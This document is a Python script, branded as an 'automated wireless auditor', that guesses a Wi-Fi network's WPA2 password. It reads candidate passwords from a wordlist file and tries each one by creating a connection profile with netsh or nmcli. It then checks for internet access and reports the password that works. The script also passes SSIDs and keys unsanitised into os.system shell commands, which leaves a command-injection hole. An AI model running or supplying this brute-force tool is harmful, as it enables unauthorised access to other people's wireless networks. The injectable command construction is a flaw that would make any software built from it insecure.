import os
import platform
import getpass
import colorama
from colorama import Fore,Back,Style
import urllib
from urllib.request import urlopen
colorama.init()
def printlogo():
        print("""                                   _ _                                           """, Fore.YELLOW)
        print("""   _                             / _ _|           ,;'  ,;'          `;,  `;,        """, Fore.MAGENTA)
        print("""  | |                          _| |_ _          .;'   ;'   ,;'    `;,  `;,   `;,        """, Fore.GREEN)
        print("""  | |__  _   _ _ __  _ __  _  |_   _|_|         ::   ::   :   ( )   :   ::   ::  automated wireless  """, Fore.RED)
        print("""  | '_ \| | | | '_ \| '_ \| | | | |  _          ':.  ':.  ':. /_\ ,:'  ,:'  ,:'       auditor""", Fore.WHITE)
        print("""  | |_) | |_| | | | | | | | |_| | | | |          ':.   ':.   /___\    ,:'  ,:'   designed for windows      """,Fore.YELLOW)
        print("""  |_.__/ \__,_|_| |_|_| |_|\__, |_| |_|             ':.     /_____\      ,:'          """, Fore.BLUE)
        print("""                           __/  |                          /       \                 """, Fore.MAGENTA)
        print("""                          |___ /                                              """, Fore.RED)
        print("""                                                                               """, Fore.WHITE)
        print("""                                                                              """, Fore.GREEN)                                                                         
        print('\n')
printlogo()
y = "y"
Y = "Y"
n = "n"
N = "N"
def createNewConnection(name, SSID, key):
    config = """<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>"""+name+"""</name>
    <SSIDConfig>
        <SSID>
            <name>"""+SSID+"""</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>"""+key+"""</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
    if platform.system() == "Windows":
        command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"
        with open(name+".xml", 'w') as file:
            file.write(config)
    elif platform.system() == "Linux":
        command = "nmcli dev wifi connect '"+SSID+"' password '"+key+"'"
    os.system(command)
    if platform.system() == "Windows":
        os.remove(name+".xml")

def connect(name, SSID):
    if platform.system() == "Windows":
        command = "netsh wlan connect name=\""+name+"\" ssid=\""+SSID+"\" interface=Wi-Fi"
    elif platform.system() == "Linux":
        command = "nmcli con up "+SSID
    os.system(command)
def is_internet():
    """Query internet using python
    :return:
    """
    try:
       urlopen("https://www.youtube.com", timeout=1)
       return True
    except urllib.error.URLError as Error:
        print(Error)
        return False
def displayAvailableNetworks():
    if platform.system() == "Windows":
        command = "netsh wlan show networks interface=Wi-Fi"
    elif platform.system() == "Linux":
        command = "nmcli dev wifi list"
    os.system(command)
try:
    displayAvailableNetworks()
    option = input("New connection (y/N)? ")
    if option == n or option == N:
        name = input("Name: ")
        connect(name, name)
        print("If you aren't connected to this network, try connecting with correct credentials")
    elif option == y or option == Y:
        name = input("Name: ")
        f=open('pass.txt','r')
        try:
            for key in f:
                    createNewConnection(name, name, key)
                    connect(name, name)
                    if is_internet():
                            print("password found",key)
                            break
                    else:
                             print("password wrong",key)
                
        except:
            print("password list file error")
        f.close()
except KeyboardInterrupt as e:
    print("\nExiting...")
